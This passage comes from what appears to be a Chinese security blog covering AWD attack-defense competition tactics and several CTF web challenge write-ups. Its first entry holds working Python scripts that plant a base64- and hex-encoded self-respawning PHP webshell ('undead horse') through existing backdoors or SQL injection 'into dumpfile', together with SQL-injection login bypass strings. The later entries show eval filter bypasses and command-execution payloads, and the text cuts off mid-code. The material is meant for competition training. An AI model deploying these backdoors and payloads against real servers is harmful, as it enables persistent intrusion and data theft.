class="hljs-string">&quot;[+]请输入自己队伍的token：&quot;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> first_flag_list:<br>        <span class="hljs-keyword">global</span> data<br>        data=&#123;<br>            <span class="hljs-string">&#x27;flag&#x27;</span>:j.strio(),<br>            <span class="hljs-string">&#x27;token&#x27;</span>:token<br>        &#125;<br>        submit_Flag(flag_server,data)<br>    lock.release() <span class="hljs-comment">#释放</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_undead_ma</span>(<span class="hljs-params">shell_url</span>):<br>    ma = <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/file.php&#x27;,base64_decode(&#x27;PD9waHAgDWlnbm9yZV91c2VyX2Fib3J0KHRydWUpOy8v5LiN5q276ams55qE5YWz6ZSu77yM5Y+v5Lul5YaZ6L+b6L+b56iL5LiN6KKr5p2A5q27DXNldF90aW1lX2xpbWl0KDApOy8v6K6+572u5omA5pyJ5pe26Ze06YO96IO95omn6KGMDXVubGluayhfX0ZJTEVfXyk7Ly/pmpDol4/liKDpmaToh6rlt7HvvIzmjqXkuIvmnaXnlKjkuI3mrbvpqazmlofku7blsLHooYzkuoYNJGZpbGUgPSAnLmluZGV4LnBocCc7Ly/mlofku7blkI0NJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNTg4YjA5MDliZTQ2ZGYyZTk5MjkxNWExNTZhNGU4NDgiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4nOy8v5ZCO6Zeo5YaF5a6577yM6K6+572ubWQ15a+G56CB6Ziy5q2i5Yir5Lq65Yip55SoDXdoaWxlICgxKXsgIC8vd2hpbGXmrbvlvqrnjq/lhpnlhaXlkI7pl6jvvIENICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsvL+WGmeWQjumXqOWHveaVsA0gICAgdXNsZWVwKDUwMDApOy8v6Ze06ZqU5pe26Ze0DX0NPz4&#x27;));&quot;</span>  <span class="hljs-comment">#需要改绝对路径，与开头的dir的值对应</span><br>    data1=&#123;passwd:ma&#125;<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">type</span>)==<span class="hljs-number">1</span>):<br>            res=requests.get(shell_url,data1,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            res=requests.post(shell_url,data1,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> res.status_code==<span class="hljs-number">200</span>:<br>            result=shell_url+<span class="hljs-string">&quot;upload undead_ma success&quot;</span><br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;upload undead_ma fail&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>         <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;connect shell fail&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">activate_undead_ma</span>(<span class="hljs-params">url_head1</span>):<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.get(url_head1,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(url_head1+<span class="hljs-string">&quot;[-]不死马激活失败&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(url_head1+<span class="hljs-string">&quot;[+]不死马激活成功&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;&#x27;前提：需要结合IP扫描.py使用</span><br><span class="hljs-string">    该脚本功能1：利用get或post型一句话木马实现开场第一波flag的获取</span><br><span class="hljs-string">    该脚本功能2：自动提交flag</span><br><span class="hljs-string">    该脚本功能3：通过预留后门上传不死马并触发</span><br><span class="hljs-string">    该脚本功能4：可实现后期的蹭马利用&#x27;&#x27;&#x27;</span>)<br>    file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ip_new.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    url_head=file.readlines()<br>    flag_text=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;firstround_flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]请输入shell地址 Input example:/shell.php&quot;</span>)<br>    shell_addr=<span class="hljs-built_in">input</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]请输入木马的密码Input example：shell&quot;</span>)<br>    <span class="hljs-keyword">global</span> passwd<br>    passwd=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]请选择木马类型 1.get 2.post&quot;</span>)<br>    <span class="hljs-keyword">global</span> <span class="hljs-built_in">type</span><br>    <span class="hljs-built_in">type</span>=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    t=threading.Thread(target=prepare_get_post)<br>    t.start()<br></code></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>如果仅有www-data用户权限，上传路径必须是具有www-data用户权限的文件夹，如果上传的文件夹需要root权限，那么将无法上传。一般upload字样的文件夹都是可以上传的。</p><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><p>1，先进行扫描操作，找到攻击目标。</p><p>2，D盾扫描（找到后门清除）修改初始化口令等，</p><p>3，攻击手利用脚本进行攻击，自动提交flag，注入不死马等</p><p>4，防御手接着进行代码</p><p>防御：</p><p>如果被写入了不死马呢 这个时候，我们再回想一下，守护进程不是可以一直地监听端口，然后不断地fork服务么？这就相当于即使木马不断kill掉服务，它依然会被不断地重启。<br> 这种情况下我们就可以有一种骚操作了，我们先把&#x2F;bin&#x2F;bash给复制成与服务同名，覆盖掉原来的服务。（当然原来的服务肯定要先备份），大概就是下面三条命令就可以完成了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash ./game<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;kill -9 -1&quot;</span> | nc 127.0.0.1 2019 <br></code></pre></td></tr></table></figure><p>这条命令类似于直接把kill -9 -1给发送过去，一旦fork game(实际是bash)，接着就会执行 kill -9  -1命令。这样就会在不死马把game（实际是bash）杀掉之前先把 test 用户的所有进程 kill  掉。这样一来，因为不死马也是test权限运行的，也被杀掉了。最后只要把备份好的服务重新替换回来就正常了。</p><h2 id="3-黑盒测试"><a href="#3-黑盒测试" class="headerlink" title="3.黑盒测试"></a>3.黑盒测试</h2><p>前期利用后门+脚本得分，这只是其中一部分，比赛预制漏洞远不止此，在代发审计的同时，攻击手包括但不限于对以下常规漏洞进行测试：例如 <strong>sql注入，文件上传，文件包含，目录穿越</strong>等。</p><h3 id="1-sql注入："><a href="#1-sql注入：" class="headerlink" title="1.sql注入："></a>1.sql注入：</h3><p>原因：sql注入的原因是没有对用户的输入内容做严格的把控，导致其可以改变原来的代码的功能。所以黑盒测试关键点也在于与数据库存在交互的地方。</p><p>常见的与数据库交互的地方：</p><p>1.登录界面</p><p>2.调用参数的页面查询</p><p>3.后台的可控参数等</p><p>万能密码：</p><p>（1）admin or 1&#x3D;1</p><p>（2）admin’ or ‘1’&#x3D;’1</p><p>  (3)admin” or 1&#x3D;1–</p><p>(4)admin” or 1&#x3D;1#</p><p>(5) ‘ or 1&#x3D;1&#x2F;*</p><p>写马：</p><p>以mysql为例：如果配置文件中的secure_file_priv为空的话，表示不限制mysqld在任意目录的导入导出</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304192001941.png"></p><p>sql注入漏洞利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br>lock=threading.Lock()<br><span class="hljs-built_in">dir</span> =<span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-comment">#这里为不死马被写入的路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_get_post</span>():<br>    lock.acquire(<span class="hljs-literal">True</span>) <span class="hljs-comment">#锁定</span><br>    <span class="hljs-keyword">global</span> payload <span class="hljs-comment">#下面payload根据实际情况判断是否是字符型注入</span><br>    payload= <span class="hljs-string">&quot;-1&#x27; union select 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b203f3e,3 into dumpfile &#x27;d:\\phpstudy\\www\\ma\\file.php&#x27; --+&quot;</span><br>    <span class="hljs-keyword">global</span> data<br>    data=&#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>:payload,<br>        <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span><br>    &#125; <span class="hljs-comment">#根据实际情况修改参数</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> url_head:<br>        url_undead=i.strip()+<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;file.php&#x27;</span> <span class="hljs-comment">#要写入的文件路径</span><br>        shell_url=i.strip()+shell_addr<br>        submit_undead_ma(shell_url)<br>        activate_undead_ma(url_undead)<br>    lock.release() <span class="hljs-comment">#释放</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_undead_ma</span>(<span class="hljs-params">shell_url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">type</span>)==<span class="hljs-number">1</span>):<br>            res=requests.get(shell_url,data,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            res=requests.post(shell_url,data,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> res.status_code==<span class="hljs-number">200</span>:<br>            result=shell_url+<span class="hljs-string">&quot;upload undead_ma success&quot;</span><br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;upload undead_ma fail&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;connect shell fail&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">activate_undead_ma</span>(<span class="hljs-params">url_head1</span>):<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.get(url_head1,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(url_head1+<span class="hljs-string">&quot;[-]不死马激活失败&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(url_head1+<span class="hljs-string">&quot;[+]不死马激活成功&quot;</span>)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ip.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    url_head=file.readlines()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]请输入存在sql注入的漏洞地址 example：login.php&quot;</span>)<br>    shell_addr=<span class="hljs-built_in">input</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]请选择注入类型 1.get 2.post&quot;</span>)<br>    <span class="hljs-keyword">global</span> <span class="hljs-built_in">type</span><br>    <span class="hljs-built_in">type</span>=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    t=threading.Thread(target=prepare_get_post)<br>    t.start()<br></code></pre></td></tr></table></figure><p>该脚本使用前要先通过order by 手工注入判断字段数，脚本中的十六进制是不死马代码的十六进制，(转换时需要将不死马集中到一行，这样才会生效)，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?php <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>); <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>); <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<span class="hljs-title function_ invoke__">file_put_contents</span>(.config.php<span class="hljs-string">&#x27;,&#x27;</span>&lt;?php <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])===<span class="hljs-string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;);usleep(5000);?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>AWD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻击步骤</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf.show_红包题</title>
    <link href="/2022/02/12/ctf.show_%E7%BA%A2%E5%8C%85%E9%A2%98/"/>
    <url>/2022/02/12/ctf.show_%E7%BA%A2%E5%8C%85%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="ctf-show-红包题"><a href="#ctf-show-红包题" class="headerlink" title="ctf.show_红包题"></a>ctf.show_红包题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cerror&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;serror&quot;</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不能含有除了p以外的大小写字母和数字，且不能含有特殊字符：$~!@#%^&amp;等等。可以使用的有：p &#96; ? &#x2F; + &lt; &gt; &#x3D; </p><p> 通过可用的字符构造cmd&#x3D;?&gt;&lt;?&#x3D;<code>.+/??p/p?p??????</code>，由eval（$cmd）来运行临时文件  </p><p> 解释构造原理：  </p><?= $cmd ?><p> 等于 <?php echo($cmd) ?></p><p> 在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错。  </p><p> 点命令等于source命令，用来执行文件。     source &#x2F;home&#x2F;user&#x2F;bash   等同于   . &#x2F;home&#x2F;user&#x2F;bash  </p><p>  URL编码中空格为%20，+表示为%2B。然而url中+也可以表示空格，要表示+号必须得用%2B。  </p><p><strong>临时文件夹目录</strong></p><p>php上传文件后会将文件存储在临时文件夹，然后用move_uploaded_file() 函数将上传的文件移动到新位置。临时文件夹可通过php.ini的upload_tmp_dir 指定，默认是&#x2F;tmp目录。</p><p> 问号?代表一个任意字符，通配符&#x2F;??p&#x2F;p?p??????匹配&#x2F;tmp&#x2F;phpxxxxxx  </p><p>cmd&#x3D;?&gt;<?=`.+/??p/p?p??????`; -> cmd=?>&lt;?php echo(<code>source  /tmp/php**.tmp </code>,)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Type: multipart/form-data; boundary=---------------------------<span class="hljs-number">10242300956292313528205888</span><br>Content-Length: <span class="hljs-number">236</span><br><br>-----------------------------<span class="hljs-number">10242300956292313528205888</span><br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;fileUpload&quot;</span>; filename=<span class="hljs-string">&quot;1.txt&quot;</span><br>Content-Type: text/plain<br><br><span class="hljs-comment">#! /bin/bash</span><br><br>cat /f*<br>-----------------------------<span class="hljs-number">10242300956292313528205888</span>--<br></code></pre></td></tr></table></figure><p>Content-Type有两个值：①application&#x2F;x-www-form-urlencoded(默认值) ：上传键值对</p><p>②multipart&#x2F;form-data：上传文件</p><p>boundary为边界分隔符</p><p>文件开始标记：—————————–10242300956292313528205888</p><p>文件结束标记：—————————–10242300956292313528205888–</p><p>其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。</p><p> #! &#x2F;bin&#x2F;sh 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：sh,csh,ksh,tcsh。首先用命令ls &#x2F;  来查看服务器根目录有哪些文件，发现有flag.txt，然后再用cat &#x2F;flag.txt 即可。  </p><p> 如果开启允许文件上传，我们就可以上传文件，访问&#x2F;tmp下面的文件<br>(因为没有move_uploaded_file($_FILES[“file”][“tmp_name”], “upload&#x2F;“ . $_FILES[“file”][“name”]);)<br>移动文件，所以只能在临时文件下面。  </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP是世界上最好的语言</title>
    <link href="/2022/02/06/PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80/"/>
    <url>/2022/02/06/PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h1><h3 id="一，分析代码"><a href="#一，分析代码" class="headerlink" title="一，分析代码"></a>一，分析代码</h3><p>进入题目，看到以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in $flag  </span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>); <span class="hljs-comment">#文件包含</span><br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;sys&#x27;</span>];   <br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag2&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag2&#x27;</span>])) &#123;<span class="hljs-comment">#不能传键名flag1，flag2</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonononono&quot;</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);<span class="hljs-comment">#查询query字符串，parse_str()函数会把查询字符串解析到变量中</span><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<span class="hljs-comment">#将$_POST超级变量数组获取的变量转为正常的变量</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span> == <span class="hljs-string">&#x27;8gen1&#x27;</span> &amp;&amp; <span class="hljs-variable">$flag2</span> == <span class="hljs-string">&#x27;8gen1&#x27;</span>) &#123; <span class="hljs-comment">#必须使flag1=8gen1 &amp;&amp; flag2=8gen2</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;504_SYS.COM&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\?/&quot;</span>, <span class="hljs-variable">$c</span>))&#123; <span class="hljs-comment">#正则匹配</span><br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>);   <span class="hljs-comment">#命令执行点</span><br><br>    &#125;<br>&#125;<br>&#125; <br></code></pre></td></tr></table></figure><h4 id="简答补充以下函数"><a href="#简答补充以下函数" class="headerlink" title="简答补充以下函数"></a>简答补充以下函数</h4><p>1.<code>$_SERVER[&quot;QUERY_STRING&quot;]</code></p><p>说明：查询(query)的字符串</p><p>2.<code>$_SERVER[&quot;REQUEST_URI&quot;]</code></p><p>说明：访问此页面所需的URI<br> 　　<br> 3.<code>$_SERVER[&quot;SCRIPT_NAME&quot;]</code></p><p>说明：包含当前脚本的路径<br> 　　<br> 4.<code>$_SERVER[&quot;PHP_SELF&quot;]</code></p><p>说明：当前正在执行脚本的文件名</p><p>简单举个例子：</p><p><a href="http://www.baidu.com/news/">http://www.baidu.com/news/</a></p><p>$_SERVER[“QUERY_STRING”]&#x3D;&#x3D;&#x3D;&gt;” “</p><p>$_SERVER[“REQUEST_URI”]&#x3D;&#x3D;&#x3D;&gt;”&#x2F;news&#x2F;“</p><p>$_SERVER[“SCRIPT_NAME”]&#x3D;&#x3D;&#x3D;&gt;”&#x2F;news&#x2F;index.php”</p><p>$_SERVER[“PHP_SELF”]&#x3D;&#x3D;&#x3D;&gt;”&#x2F;new&#x2F;index.php”</p><p><a href="http://www.baidu.com/news/?id=1">http://www.baidu.com/news/?id=1</a></p><p>$_SERVER[“QUERY_STRING”]&#x3D;&#x3D;&#x3D;&gt;” id&#x3D;1”</p><p>$_SERVER[“REQUEST_URI”]&#x3D;&#x3D;&#x3D;&gt;”&#x2F;news&#x2F;?id&#x3D;1”</p><p>$_SERVER[“SCRIPT_NAME”]&#x3D;&#x3D;&#x3D;&gt;”&#x2F;news&#x2F;index.php”</p><p>$_SERVER[“PHP_SELF”]&#x3D;&#x3D;&#x3D;&gt;”&#x2F;new&#x2F;index.php”</p><h4 id="分析要求："><a href="#分析要求：" class="headerlink" title="分析要求："></a>分析要求：</h4><p>使flag1&#x3D;8gen1 &amp;&amp; flag2&#x3D;8gen2并且pos传值 504_SYS.COM</p><p>不能传键名flag1，flag2且要求flag1&#x3D;8gen1 &amp;&amp; flag2&#x3D;8gen2突破点就在于extract($_POST);#将$_POST超级变量<strong>数组</strong>获取的变量转为正常的变量</p><h4 id="构造payload："><a href="#构造payload：" class="headerlink" title="构造payload："></a>构造payload：</h4><p>get传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?_POST[flag1]=8gen1&amp;_POST[flag2]=8gen1<br></code></pre></td></tr></table></figure><p>这样经过extract（$POST）就会变成lag1&#x3D;8gen1 &amp;&amp; flag2&#x3D;8gen2，</p><p>进入下一层。</p><h4 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h4><p>发现过滤掉了很多符号，</p><p>键名 504_SYS.COM&#x3D;</p><p>根据php变量命名规则，不能出现”.”，传进去的变量名会将 , +,.,[转换成_若变量中有” [ “  , [替换成_后，之后的字符不会再被替换成_，所以我们构造payload为</p><p>post传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">504[SYS.<span class="hljs-attribute">COM</span>=1&amp;sys=echo <span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304102115887.png" alt="image-20230410211550208"></p><p>拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-show 红包题第六弹</title>
    <link href="/2022/01/06/ctf-show%20%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E5%85%AD%E5%BC%B9/"/>
    <url>/2022/01/06/ctf-show%20%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E5%85%AD%E5%BC%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="ctf-show-红包题第六弹"><a href="#ctf-show-红包题第六弹" class="headerlink" title="ctf-show 红包题第六弹"></a>ctf-show 红包题第六弹</h1><p>​</p><p>进入题目</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111031137.png" alt="img"></p><p>尝试sql注入，显示md5 error，查看源代码</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111031404.png" alt="img"></p><p>后来发现hint、有关键代码</p><p>用dirserch扫描到</p><p><a href="http://www.zip/">www.zip</a> 下载查看check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">receiveStreamFile</span>(<span class="hljs-params"><span class="hljs-variable">$receiveFile</span></span>)</span>&#123;<br><span class="hljs-variable">$streamData</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span 